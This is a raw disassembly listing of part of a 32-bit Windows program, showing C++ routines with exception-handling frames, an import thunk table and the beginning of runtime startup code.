  40404e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404055:	81 ec c4 00 00 00    	sub    $0xc4,%esp
  40405b:	56                   	push   %esi
  40405c:	8b f1                	mov    %ecx,%esi
  40405e:	6a 00                	push   $0x0
  404060:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404064:	e8 57 e5 ff ff       	call   0x4025c0
  404069:	6a 00                	push   $0x0
  40406b:	8b ce                	mov    %esi,%ecx
  40406d:	c7 84 24 d4 00 00 00 	movl   $0x0,0xd4(%esp)
  404074:	00 00 00 00 
  404078:	e8 97 07 00 00       	call   0x404814
  40407d:	8b 46 68             	mov    0x68(%esi),%eax
  404080:	51                   	push   %ecx
  404081:	8b cc                	mov    %esp,%ecx
  404083:	89 64 24 08          	mov    %esp,0x8(%esp)
  404087:	85 c0                	test   %eax,%eax
  404089:	89 01                	mov    %eax,(%ecx)
  40408b:	74 06                	je     0x404093
  40408d:	8b 08                	mov    (%eax),%ecx
  40408f:	50                   	push   %eax
  404090:	ff 51 04             	call   *0x4(%ecx)
  404093:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404097:	e8 d4 00 00 00       	call   0x404170
  40409c:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4040a0:	e8 69 04 00 00       	call   0x40450e
  4040a5:	6a 05                	push   $0x5
  4040a7:	8b ce                	mov    %esi,%ecx
  4040a9:	e8 66 07 00 00       	call   0x404814
  4040ae:	8b 84 24 c4 00 00 00 	mov    0xc4(%esp),%eax
  4040b5:	c7 84 24 d0 00 00 00 	movl   $0x7,0xd0(%esp)
  4040bc:	07 00 00 00 
  4040c0:	85 c0                	test   %eax,%eax
  4040c2:	74 06                	je     0x4040ca
  4040c4:	8b 10                	mov    (%eax),%edx
  4040c6:	50                   	push   %eax
  4040c7:	ff 52 08             	call   *0x8(%edx)
  4040ca:	8d 8c 24 c0 00 00 00 	lea    0xc0(%esp),%ecx
  4040d1:	c6 84 24 d0 00 00 00 	movb   $0x6,0xd0(%esp)
  4040d8:	06 
  4040d9:	e8 26 05 00 00       	call   0x404604
  4040de:	8d 8c 24 b8 00 00 00 	lea    0xb8(%esp),%ecx
  4040e5:	c6 84 24 d0 00 00 00 	movb   $0x5,0xd0(%esp)
  4040ec:	05 
  4040ed:	e8 12 05 00 00       	call   0x404604
  4040f2:	8d 8c 24 b4 00 00 00 	lea    0xb4(%esp),%ecx
  4040f9:	c6 84 24 d0 00 00 00 	movb   $0x4,0xd0(%esp)
  404100:	04 
  404101:	e8 fe 04 00 00       	call   0x404604
  404106:	8d 8c 24 b0 00 00 00 	lea    0xb0(%esp),%ecx
  40410d:	c6 84 24 d0 00 00 00 	movb   $0x3,0xd0(%esp)
  404114:	03 
  404115:	e8 ea 04 00 00       	call   0x404604
  40411a:	8d 8c 24 ac 00 00 00 	lea    0xac(%esp),%ecx
  404121:	c6 84 24 d0 00 00 00 	movb   $0x2,0xd0(%esp)
  404128:	02 
  404129:	e8 d6 04 00 00       	call   0x404604
  40412e:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  404132:	c6 84 24 d0 00 00 00 	movb   $0x1,0xd0(%esp)
  404139:	01 
  40413a:	e8 55 05 00 00       	call   0x404694
  40413f:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404143:	c7 84 24 d0 00 00 00 	movl   $0xffffffff,0xd0(%esp)
  40414a:	ff ff ff ff 
  40414e:	e8 b7 04 00 00       	call   0x40460a
  404153:	8b 8c 24 c8 00 00 00 	mov    0xc8(%esp),%ecx
  40415a:	5e                   	pop    %esi
  40415b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404162:	81 c4 d0 00 00 00    	add    $0xd0,%esp
  404168:	c3                   	ret
  404169:	90                   	nop
  40416a:	90                   	nop
  40416b:	90                   	nop
  40416c:	90                   	nop
  40416d:	90                   	nop
  40416e:	90                   	nop
  40416f:	90                   	nop
  404170:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404176:	6a ff                	push   $0xffffffff
  404178:	68 48 54 40 00       	push   $0x405448
  40417d:	50                   	push   %eax
  40417e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404185:	56                   	push   %esi
  404186:	57                   	push   %edi
  404187:	8b b9 bc 00 00 00    	mov    0xbc(%ecx),%edi
  40418d:	8b 74 24 18          	mov    0x18(%esp),%esi
  404191:	3b fe                	cmp    %esi,%edi
  404193:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40419a:	00 
  40419b:	74 1a                	je     0x4041b7
  40419d:	85 f6                	test   %esi,%esi
  40419f:	89 b1 bc 00 00 00    	mov    %esi,0xbc(%ecx)
  4041a5:	74 06                	je     0x4041ad
  4041a7:	8b 06                	mov    (%esi),%eax
  4041a9:	56                   	push   %esi
  4041aa:	ff 50 04             	call   *0x4(%eax)
  4041ad:	85 ff                	test   %edi,%edi
  4041af:	74 06                	je     0x4041b7
  4041b1:	8b 0f                	mov    (%edi),%ecx
  4041b3:	57                   	push   %edi
  4041b4:	ff 51 08             	call   *0x8(%ecx)
  4041b7:	85 f6                	test   %esi,%esi
  4041b9:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4041c0:	ff 
  4041c1:	74 06                	je     0x4041c9
  4041c3:	8b 16                	mov    (%esi),%edx
  4041c5:	56                   	push   %esi
  4041c6:	ff 52 08             	call   *0x8(%edx)
  4041c9:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4041cd:	5f                   	pop    %edi
  4041ce:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4041d5:	5e                   	pop    %esi
  4041d6:	83 c4 0c             	add    $0xc,%esp
  4041d9:	c2 04 00             	ret    $0x4
  4041dc:	90                   	nop
  4041dd:	90                   	nop
  4041de:	90                   	nop
  4041df:	90                   	nop
  4041e0:	6a ff                	push   $0xffffffff
  4041e2:	68 a4 54 40 00       	push   $0x4054a4
  4041e7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4041ed:	50                   	push   %eax
  4041ee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4041f5:	81 ec 28 01 00 00    	sub    $0x128,%esp
  4041fb:	56                   	push   %esi
  4041fc:	8b f1                	mov    %ecx,%esi
  4041fe:	6a 00                	push   $0x0
  404200:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  404204:	e8 f7 cd ff ff       	call   0x401000
  404209:	6a 00                	push   $0x0
  40420b:	8b ce                	mov    %esi,%ecx
  40420d:	c7 84 24 38 01 00 00 	movl   $0x0,0x138(%esp)
  404214:	00 00 00 00 
  404218:	e8 f7 05 00 00       	call   0x404814
  40421d:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404221:	e8 e8 02 00 00       	call   0x40450e
  404226:	8b 44 24 68          	mov    0x68(%esp),%eax
  40422a:	6a 00                	push   $0x0
  40422c:	8b 40 f8             	mov    -0x8(%eax),%eax
  40422f:	85 c0                	test   %eax,%eax
  404231:	0f 8e a5 00 00 00    	jle    0x4042dc
  404237:	8d 4c 24 74          	lea    0x74(%esp),%ecx
  40423b:	e8 30 dd ff ff       	call   0x401f70
  404240:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  404244:	8d 54 24 68          	lea    0x68(%esp),%edx
  404248:	51                   	push   %ecx
  404249:	52                   	push   %edx
  40424a:	51                   	push   %ecx
  40424b:	8d 46 68             	lea    0x68(%esi),%eax
  40424e:	8b cc                	mov    %esp,%ecx
  404250:	89 64 24 10          	mov    %esp,0x10(%esp)
  404254:	50                   	push   %eax
  404255:	c6 84 24 44 01 00 00 	movb   $0x1,0x144(%esp)
  40425c:	01 
  40425d:	e8 de 01 00 00       	call   0x404440
  404262:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  404266:	e8 d5 00 00 00       	call   0x404340
  40426b:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  40426f:	e8 9a 02 00 00       	call   0x40450e
  404274:	8d 8c 24 24 01 00 00 	lea    0x124(%esp),%ecx
  40427b:	c6 84 24 34 01 00 00 	movb   $0x5,0x134(%esp)
  404282:	05 
  404283:	e8 7c 03 00 00       	call   0x404604
  404288:	8b 84 24 20 01 00 00 	mov    0x120(%esp),%eax
  40428f:	c6 84 24 34 01 00 00 	movb   $0x4,0x134(%esp)
  404296:	04 
  404297:	85 c0                	test   %eax,%eax
  404299:	74 06                	je     0x4042a1
  40429b:	8b 08                	mov    (%eax),%ecx
  40429d:	50                   	push   %eax
  40429e:	ff 51 08             	call   *0x8(%ecx)
  4042a1:	8d 8c 24 10 01 00 00 	lea    0x110(%esp),%ecx
  4042a8:	c6 84 24 34 01 00 00 	movb   $0x3,0x134(%esp)
  4042af:	03 
  4042b0:	e8 4f 03 00 00       	call   0x404604
  4042b5:	8d 8c 24 d0 00 00 00 	lea    0xd0(%esp),%ecx
  4042bc:	c6 84 24 34 01 00 00 	movb   $0x2,0x134(%esp)
  4042c3:	02 
  4042c4:	e8 cb 03 00 00       	call   0x404694
  4042c9:	8d 4c 24 70          	lea    0x70(%esp),%ecx
  4042cd:	c6 84 24 34 01 00 00 	movb   $0x0,0x134(%esp)
  4042d4:	00 
  4042d5:	e8 30 03 00 00       	call   0x40460a
  4042da:	eb 0e                	jmp    0x4042ea
  4042dc:	6a 00                	push   $0x0
  4042de:	68 68 43 45 00       	push   $0x454368
  4042e3:	8b ce                	mov    %esi,%ecx
  4042e5:	e8 30 05 00 00       	call   0x40481a
  4042ea:	6a 05                	push   $0x5
  4042ec:	8b ce                	mov    %esi,%ecx
  4042ee:	e8 21 05 00 00       	call   0x404814
  4042f3:	8d 4c 24 68          	lea    0x68(%esp),%ecx
  4042f7:	c7 84 24 34 01 00 00 	movl   $0x6,0x134(%esp)
  4042fe:	06 00 00 00 
  404302:	e8 fd 02 00 00       	call   0x404604
  404307:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40430b:	c7 84 24 34 01 00 00 	movl   $0xffffffff,0x134(%esp)
  404312:	ff ff ff ff 
  404316:	e8 ef 02 00 00       	call   0x40460a
  40431b:	8b 8c 24 2c 01 00 00 	mov    0x12c(%esp),%ecx
  404322:	5e                   	pop    %esi
  404323:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40432a:	81 c4 34 01 00 00    	add    $0x134,%esp
  404330:	c3                   	ret
  404331:	90                   	nop
  404332:	90                   	nop
  404333:	90                   	nop
  404334:	90                   	nop
  404335:	90                   	nop
  404336:	90                   	nop
  404337:	90                   	nop
  404338:	90                   	nop
  404339:	90                   	nop
  40433a:	90                   	nop
  40433b:	90                   	nop
  40433c:	90                   	nop
  40433d:	90                   	nop
  40433e:	90                   	nop
  40433f:	90                   	nop
  404340:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404346:	6a ff                	push   $0xffffffff
  404348:	68 b8 54 40 00       	push   $0x4054b8
  40434d:	50                   	push   %eax
  40434e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404355:	53                   	push   %ebx
  404356:	56                   	push   %esi
  404357:	57                   	push   %edi
  404358:	8b f9                	mov    %ecx,%edi
  40435a:	8b 9f b0 00 00 00    	mov    0xb0(%edi),%ebx
  404360:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  404364:	3b de                	cmp    %esi,%ebx
  404366:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40436d:	00 
  40436e:	74 1a                	je     0x40438a
  404370:	85 f6                	test   %esi,%esi
  404372:	89 b7 b0 00 00 00    	mov    %esi,0xb0(%edi)
  404378:	74 06                	je     0x404380
  40437a:	8b 06                	mov    (%esi),%eax
  40437c:	56                   	push   %esi
  40437d:	ff 50 04             	call   *0x4(%eax)
  404380:	85 db                	test   %ebx,%ebx
  404382:	74 06                	je     0x40438a
  404384:	8b 0b                	mov    (%ebx),%ecx
  404386:	53                   	push   %ebx
  404387:	ff 51 08             	call   *0x8(%ecx)
  40438a:	8b 54 24 20          	mov    0x20(%esp),%edx
  40438e:	8d 8f b4 00 00 00    	lea    0xb4(%edi),%ecx
  404394:	52                   	push   %edx
  404395:	e8 24 03 00 00       	call   0x4046be
  40439a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40439e:	c7 44 24 14 ff ff ff 	movl   $0xffffffff,0x14(%esp)
  4043a5:	ff 
  4043a6:	85 f6                	test   %esi,%esi
  4043a8:	89 87 b8 00 00 00    	mov    %eax,0xb8(%edi)
  4043ae:	74 06                	je     0x4043b6
  4043b0:	8b 0e                	mov    (%esi),%ecx
  4043b2:	56                   	push   %esi
  4043b3:	ff 51 08             	call   *0x8(%ecx)
  4043b6:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4043ba:	5f                   	pop    %edi
  4043bb:	5e                   	pop    %esi
  4043bc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4043c3:	5b                   	pop    %ebx
  4043c4:	83 c4 0c             	add    $0xc,%esp
  4043c7:	c2 0c 00             	ret    $0xc
  4043ca:	90                   	nop
  4043cb:	90                   	nop
  4043cc:	90                   	nop
  4043cd:	90                   	nop
  4043ce:	90                   	nop
  4043cf:	90                   	nop
  4043d0:	6a ff                	push   $0xffffffff
  4043d2:	68 d8 54 40 00       	push   $0x4054d8
  4043d7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4043dd:	50                   	push   %eax
  4043de:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4043e5:	83 ec 60             	sub    $0x60,%esp
  4043e8:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  4043ec:	e8 3f ec ff ff       	call   0x403030
  4043f1:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  4043f5:	c7 44 24 68 00 00 00 	movl   $0x0,0x68(%esp)
  4043fc:	00 
  4043fd:	e8 0c 01 00 00       	call   0x40450e
  404402:	8d 4c 24 00          	lea    0x0(%esp),%ecx
  404406:	c7 44 24 68 ff ff ff 	movl   $0xffffffff,0x68(%esp)
  40440d:	ff 
  40440e:	e8 f7 01 00 00       	call   0x40460a
  404413:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  404417:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40441e:	83 c4 6c             	add    $0x6c,%esp
  404421:	c3                   	ret
  404422:	90                   	nop
  404423:	90                   	nop
  404424:	90                   	nop
  404425:	90                   	nop
  404426:	90                   	nop
  404427:	90                   	nop
  404428:	90                   	nop
  404429:	90                   	nop
  40442a:	90                   	nop
  40442b:	90                   	nop
  40442c:	90                   	nop
  40442d:	90                   	nop
  40442e:	90                   	nop
  40442f:	90                   	nop
  404430:	6a 05                	push   $0x5
  404432:	68 78 43 45 00       	push   $0x454378
  404437:	ff 15 24 60 40 00    	call   *0x406024
  40443d:	c3                   	ret
  40443e:	90                   	nop
  40443f:	90                   	nop
  404440:	8b 44 24 04          	mov    0x4(%esp),%eax
  404444:	56                   	push   %esi
  404445:	8b f1                	mov    %ecx,%esi
  404447:	8b 00                	mov    (%eax),%eax
  404449:	85 c0                	test   %eax,%eax
  40444b:	89 06                	mov    %eax,(%esi)
  40444d:	74 06                	je     0x404455
  40444f:	8b 08                	mov    (%eax),%ecx
  404451:	50                   	push   %eax
  404452:	ff 51 04             	call   *0x4(%ecx)
  404455:	8b c6                	mov    %esi,%eax
  404457:	5e                   	pop    %esi
  404458:	c2 04 00             	ret    $0x4
  40445b:	90                   	nop
  40445c:	90                   	nop
  40445d:	90                   	nop
  40445e:	90                   	nop
  40445f:	90                   	nop
  404460:	55                   	push   %ebp
  404461:	8b ec                	mov    %esp,%ebp
  404463:	6a ff                	push   $0xffffffff
  404465:	68 e8 72 40 00       	push   $0x4072e8
  40446a:	68 90 48 40 00       	push   $0x404890
  40446f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404475:	50                   	push   %eax
  404476:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40447d:	83 ec 08             	sub    $0x8,%esp
  404480:	53                   	push   %ebx
  404481:	56                   	push   %esi
  404482:	57                   	push   %edi
  404483:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404486:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40448d:	be 00 00 00 00       	mov    $0x0,%esi
  404492:	3e 8b 06             	mov    %ds:(%esi),%eax
  404495:	50                   	push   %eax
  404496:	8b ec                	mov    %esp,%ebp
  404498:	6a ff                	push   $0xffffffff
  40449a:	68 97 0c 00 00       	push   $0xc97
  40449f:	68 bb 4f 14 00       	push   $0x144fbb
  4044a4:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4044aa:	50                   	push   %eax
  4044ab:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4044b2:	58                   	pop    %eax
  4044b3:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4044b9:	58                   	pop    %eax
  4044ba:	58                   	pop    %eax
  4044bb:	58                   	pop    %eax
  4044bc:	58                   	pop    %eax
  4044bd:	8b e8                	mov    %eax,%ebp
  4044bf:	90                   	nop
  4044c0:	eb 0a                	jmp    0x4044cc
  4044c2:	b8 01 00 00 00       	mov    $0x1,%eax
  4044c7:	c3                   	ret
  4044c8:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4044cb:	90                   	nop
  4044cc:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4044d3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4044d6:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4044dd:	5f                   	pop    %edi
  4044de:	5e                   	pop    %esi
  4044df:	5b                   	pop    %ebx
  4044e0:	8b e5                	mov    %ebp,%esp
  4044e2:	5d                   	pop    %ebp
  4044e3:	c3                   	ret
  4044e4:	90                   	nop
  4044e5:	90                   	nop
  4044e6:	90                   	nop
  4044e7:	90                   	nop
  4044e8:	90                   	nop
  4044e9:	90                   	nop
  4044ea:	90                   	nop
  4044eb:	90                   	nop
  4044ec:	90                   	nop
  4044ed:	90                   	nop
  4044ee:	90                   	nop
  4044ef:	90                   	nop
  4044f0:	ff 25 6c 62 40 00    	jmp    *0x40626c
  4044f6:	ff 25 68 62 40 00    	jmp    *0x406268
  4044fc:	ff 25 64 62 40 00    	jmp    *0x406264
  404502:	ff 25 60 62 40 00    	jmp    *0x406260
  404508:	ff 25 5c 62 40 00    	jmp    *0x40625c
  40450e:	ff 25 58 62 40 00    	jmp    *0x406258
  404514:	ff 25 54 62 40 00    	jmp    *0x406254
  40451a:	ff 25 50 62 40 00    	jmp    *0x406250
  404520:	ff 25 4c 62 40 00    	jmp    *0x40624c
  404526:	ff 25 48 62 40 00    	jmp    *0x406248
  40452c:	ff 25 44 62 40 00    	jmp    *0x406244
  404532:	ff 25 40 62 40 00    	jmp    *0x406240
  404538:	ff 25 3c 62 40 00    	jmp    *0x40623c
  40453e:	ff 25 38 62 40 00    	jmp    *0x406238
  404544:	ff 25 34 62 40 00    	jmp    *0x406234
  40454a:	ff 25 30 62 40 00    	jmp    *0x406230
  404550:	ff 25 2c 62 40 00    	jmp    *0x40622c
  404556:	ff 25 28 62 40 00    	jmp    *0x406228
  40455c:	ff 25 24 62 40 00    	jmp    *0x406224
  404562:	ff 25 20 62 40 00    	jmp    *0x406220
  404568:	ff 25 34 61 40 00    	jmp    *0x406134
  40456e:	ff 25 38 60 40 00    	jmp    *0x406038
  404574:	ff 25 3c 60 40 00    	jmp    *0x40603c
  40457a:	ff 25 40 60 40 00    	jmp    *0x406040
  404580:	ff 25 44 60 40 00    	jmp    *0x406044
  404586:	ff 25 48 60 40 00    	jmp    *0x406048
  40458c:	ff 25 4c 60 40 00    	jmp    *0x40604c
  404592:	ff 25 50 60 40 00    	jmp    *0x406050
  404598:	ff 25 54 60 40 00    	jmp    *0x406054
  40459e:	ff 25 58 60 40 00    	jmp    *0x406058
  4045a4:	ff 25 5c 60 40 00    	jmp    *0x40605c
  4045aa:	ff 25 60 60 40 00    	jmp    *0x406060
  4045b0:	ff 25 64 60 40 00    	jmp    *0x406064
  4045b6:	ff 25 68 60 40 00    	jmp    *0x406068
  4045bc:	ff 25 6c 60 40 00    	jmp    *0x40606c
  4045c2:	ff 25 70 60 40 00    	jmp    *0x406070
  4045c8:	ff 25 74 60 40 00    	jmp    *0x406074
  4045ce:	ff 25 78 60 40 00    	jmp    *0x406078
  4045d4:	ff 25 7c 60 40 00    	jmp    *0x40607c
  4045da:	ff 25 80 60 40 00    	jmp    *0x406080
  4045e0:	ff 25 84 60 40 00    	jmp    *0x406084
  4045e6:	ff 25 88 60 40 00    	jmp    *0x406088
  4045ec:	ff 25 8c 60 40 00    	jmp    *0x40608c
  4045f2:	ff 25 90 60 40 00    	jmp    *0x406090
  4045f8:	ff 25 94 60 40 00    	jmp    *0x406094
  4045fe:	ff 25 98 60 40 00    	jmp    *0x406098
  404604:	ff 25 9c 60 40 00    	jmp    *0x40609c
  40460a:	ff 25 a0 60 40 00    	jmp    *0x4060a0
  404610:	ff 25 a4 60 40 00    	jmp    *0x4060a4
  404616:	ff 25 a8 60 40 00    	jmp    *0x4060a8
  40461c:	ff 25 ac 60 40 00    	jmp    *0x4060ac
  404622:	ff 25 b0 60 40 00    	jmp    *0x4060b0
  404628:	ff 25 b4 60 40 00    	jmp    *0x4060b4
  40462e:	ff 25 b8 60 40 00    	jmp    *0x4060b8
  404634:	ff 25 bc 60 40 00    	jmp    *0x4060bc
  40463a:	ff 25 c4 60 40 00    	jmp    *0x4060c4
  404640:	ff 25 c8 60 40 00    	jmp    *0x4060c8
  404646:	ff 25 cc 60 40 00    	jmp    *0x4060cc
  40464c:	ff 25 d0 60 40 00    	jmp    *0x4060d0
  404652:	ff 25 d4 60 40 00    	jmp    *0x4060d4
  404658:	ff 25 d8 60 40 00    	jmp    *0x4060d8
  40465e:	ff 25 dc 60 40 00    	jmp    *0x4060dc
  404664:	ff 25 e0 60 40 00    	jmp    *0x4060e0
  40466a:	ff 25 e4 60 40 00    	jmp    *0x4060e4
  404670:	ff 25 e8 60 40 00    	jmp    *0x4060e8
  404676:	ff 25 ec 60 40 00    	jmp    *0x4060ec
  40467c:	ff 25 f0 60 40 00    	jmp    *0x4060f0
  404682:	ff 25 f4 60 40 00    	jmp    *0x4060f4
  404688:	ff 25 f8 60 40 00    	jmp    *0x4060f8
  40468e:	ff 25 fc 60 40 00    	jmp    *0x4060fc
  404694:	ff 25 00 61 40 00    	jmp    *0x406100
  40469a:	ff 25 04 61 40 00    	jmp    *0x406104
  4046a0:	ff 25 08 61 40 00    	jmp    *0x406108
  4046a6:	ff 25 0c 61 40 00    	jmp    *0x40610c
  4046ac:	ff 25 10 61 40 00    	jmp    *0x406110
  4046b2:	ff 25 14 61 40 00    	jmp    *0x406114
  4046b8:	ff 25 18 61 40 00    	jmp    *0x406118
  4046be:	ff 25 1c 61 40 00    	jmp    *0x40611c
  4046c4:	ff 25 20 61 40 00    	jmp    *0x406120
  4046ca:	ff 25 24 61 40 00    	jmp    *0x406124
  4046d0:	ff 25 28 61 40 00    	jmp    *0x406128
  4046d6:	ff 25 2c 61 40 00    	jmp    *0x40612c
  4046dc:	ff 25 30 61 40 00    	jmp    *0x406130
  4046e2:	ff 25 38 61 40 00    	jmp    *0x406138
  4046e8:	ff 25 3c 61 40 00    	jmp    *0x40613c
  4046ee:	ff 25 40 61 40 00    	jmp    *0x406140
  4046f4:	ff 25 44 61 40 00    	jmp    *0x406144
  4046fa:	ff 25 54 61 40 00    	jmp    *0x406154
  404700:	ff 25 58 61 40 00    	jmp    *0x406158
  404706:	ff 25 5c 61 40 00    	jmp    *0x40615c
  40470c:	ff 25 60 61 40 00    	jmp    *0x406160
  404712:	ff 25 68 61 40 00    	jmp    *0x406168
  404718:	ff 25 6c 61 40 00    	jmp    *0x40616c
  40471e:	ff 25 70 61 40 00    	jmp    *0x406170
  404724:	ff 25 74 61 40 00    	jmp    *0x406174
  40472a:	ff 25 78 61 40 00    	jmp    *0x406178
  404730:	ff 25 7c 61 40 00    	jmp    *0x40617c
  404736:	ff 25 80 61 40 00    	jmp    *0x406180
  40473c:	ff 25 84 61 40 00    	jmp    *0x406184
  404742:	ff 25 88 61 40 00    	jmp    *0x406188
  404748:	ff 25 8c 61 40 00    	jmp    *0x40618c
  40474e:	ff 25 90 61 40 00    	jmp    *0x406190
  404754:	ff 25 94 61 40 00    	jmp    *0x406194
  40475a:	ff 25 98 61 40 00    	jmp    *0x406198
  404760:	ff 25 9c 61 40 00    	jmp    *0x40619c
  404766:	ff 25 a0 61 40 00    	jmp    *0x4061a0
  40476c:	ff 25 a4 61 40 00    	jmp    *0x4061a4
  404772:	ff 25 a8 61 40 00    	jmp    *0x4061a8
  404778:	ff 25 ac 61 40 00    	jmp    *0x4061ac
  40477e:	ff 25 b0 61 40 00    	jmp    *0x4061b0
  404784:	ff 25 b4 61 40 00    	jmp    *0x4061b4
  40478a:	ff 25 b8 61 40 00    	jmp    *0x4061b8
  404790:	ff 25 bc 61 40 00    	jmp    *0x4061bc
  404796:	ff 25 c0 61 40 00    	jmp    *0x4061c0
  40479c:	ff 25 c4 61 40 00    	jmp    *0x4061c4
  4047a2:	ff 25 c8 61 40 00    	jmp    *0x4061c8
  4047a8:	ff 25 cc 61 40 00    	jmp    *0x4061cc
  4047ae:	ff 25 d0 61 40 00    	jmp    *0x4061d0
  4047b4:	ff 25 d8 61 40 00    	jmp    *0x4061d8
  4047ba:	ff 25 dc 61 40 00    	jmp    *0x4061dc
  4047c0:	ff 25 e0 61 40 00    	jmp    *0x4061e0
  4047c6:	ff 25 e4 61 40 00    	jmp    *0x4061e4
  4047cc:	ff 25 e8 61 40 00    	jmp    *0x4061e8
  4047d2:	ff 25 ec 61 40 00    	jmp    *0x4061ec
  4047d8:	ff 25 f0 61 40 00    	jmp    *0x4061f0
  4047de:	ff 25 f4 61 40 00    	jmp    *0x4061f4
  4047e4:	ff 25 f8 61 40 00    	jmp    *0x4061f8
  4047ea:	ff 25 fc 61 40 00    	jmp    *0x4061fc
  4047f0:	ff 25 00 62 40 00    	jmp    *0x406200
  4047f6:	ff 25 04 62 40 00    	jmp    *0x406204
  4047fc:	ff 25 08 62 40 00    	jmp    *0x406208
  404802:	ff 25 0c 62 40 00    	jmp    *0x40620c
  404808:	ff 25 10 62 40 00    	jmp    *0x406210
  40480e:	ff 25 14 62 40 00    	jmp    *0x406214
  404814:	ff 25 18 62 40 00    	jmp    *0x406218
  40481a:	ff 25 1c 62 40 00    	jmp    *0x40621c
  404820:	ff 25 cc 62 40 00    	jmp    *0x4062cc
  404826:	cc                   	int3
  404827:	cc                   	int3
  404828:	cc                   	int3
  404829:	cc                   	int3
  40482a:	cc                   	int3
  40482b:	cc                   	int3
  40482c:	cc                   	int3
  40482d:	cc                   	int3
  40482e:	cc                   	int3
  40482f:	cc                   	int3
  404830:	83 3d 3c 45 45 00 ff 	cmpl   $0xffffffff,0x45453c
  404837:	75 0c                	jne    0x404845
  404839:	ff 74 24 04          	push   0x4(%esp)
  40483d:	ff 15 b0 62 40 00    	call   *0x4062b0
  404843:	59                   	pop    %ecx
  404844:	c3                   	ret
  404845:	68 38 45 45 00       	push   $0x454538
  40484a:	68 3c 45 45 00       	push   $0x45453c
  40484f:	ff 74 24 0c          	push   0xc(%esp)
  404853:	e8 9c 01 00 00       	call   0x4049f4
  404858:	83 c4 0c             	add    $0xc,%esp
  40485b:	c3                   	ret
  40485c:	ff 74 24 04          	push   0x4(%esp)
  404860:	e8 cb ff ff ff       	call   0x404830
  404865:	f7 d8                	neg    %eax
  404867:	1b c0                	sbb    %eax,%eax
  404869:	59                   	pop    %ecx
  40486a:	f7 d8                	neg    %eax
  40486c:	48                   	dec    %eax
  40486d:	c3                   	ret
  40486e:	56                   	push   %esi
  40486f:	8b f1                	mov    %ecx,%esi
  404871:	e8 84 01 00 00       	call   0x4049fa
  404876:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40487b:	74 07                	je     0x404884
  40487d:	56                   	push   %esi
  40487e:	e8 9f fd ff ff       	call   0x404622
  404883:	59                   	pop    %ecx
  404884:	8b c6                	mov    %esi,%eax
  404886:	5e                   	pop    %esi
  404887:	c2 04 00             	ret    $0x4
  40488a:	ff 25 d8 62 40 00    	jmp    *0x4062d8
  404890:	ff 25 b8 62 40 00    	jmp    *0x4062b8
  404896:	55                   	push   %ebp
  404897:	8b ec                	mov    %esp,%ebp
  404899:	6a ff                	push   $0xffffffff
  40489b:	68 00 73 40 00       	push   $0x407300
  4048a0:	68 90 48 40 00       	push   $0x404890
  4048a5:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4048ab:	50                   	push   %eax
  4048ac:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4048b3:	83 ec 68             	sub    $0x68,%esp
  4048b6:	53                   	push   %ebx
  4048b7:	56                   	push   %esi
  4048b8:	57                   	push   %edi
  4048b9:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4048bc:	33 db                	xor    %ebx,%ebx
  4048be:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4048c1:	6a 02                	push   $0x2
  4048c3:	ff 15 f0 62 40 00    	call   *0x4062f0
  4048c9:	59                   	pop    %ecx
  4048ca:	83 0d 38 45 45 00 ff 	orl    $0xffffffff,0x454538
  4048d1:	83 0d 3c 45 45 00 ff 	orl    $0xffffffff,0x45453c
  4048d8:	ff 15 00 63 40 00    	call   *0x406300
  4048de:	8b 0d 18 45 45 00    	mov    0x454518,%ecx
  4048e4:	89 08                	mov    %ecx,(%eax)
  4048e6:	ff 15 fc 62 40 00    	call   *0x4062fc
  4048ec:	8b 0d 14 45 45 00    	mov    0x454514,%ecx
